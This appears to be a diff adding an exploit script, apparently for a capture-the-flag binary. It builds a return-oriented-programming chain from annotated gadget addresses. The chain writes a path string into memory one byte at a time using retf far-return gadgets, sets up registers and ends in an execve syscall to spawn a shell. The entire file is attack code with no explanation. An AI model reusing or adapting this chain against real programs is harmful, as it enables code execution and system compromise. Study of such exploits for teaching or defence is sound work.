@@ -1,0 +1,81 @@
+payload = p64(0x4011ad)
+#0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x2f)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443092)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x62)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443093)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x69)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443094)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x6e)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443095)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x2f)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443096)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x66)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443097)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x68)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443098)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x0)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x4011ad)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x443099)+p64(0x410fe1)
+# 0x410fe1: or byte ptr [rbp - 0x3a], al ; retf
+payload += p32(0x41e2e5)+p32(0x33)
+# 0x41e2e5: pop rdi ; retf
+payload += p64(0x443058)+p32(0x41e170)+p32(0x33)
+# 0x41e170: pop rsi ; retf
+payload += p64(0x0)+p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x0)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x42e332)
+# 0x42e332: xchg edx, eax ; retf
+payload += p32(0x4011ad)+p32(0x33)
+# 0x00000000004011ad: pop rbp; ret; 
+payload += p64(0x3b)+p64(0x41b3b8)
+# 0x000000000041b3b8: xchg ebp, eax; ret; 
+payload += p64(0x433857)
+# 0x0000000000433857: syscall; 
+payload += b''
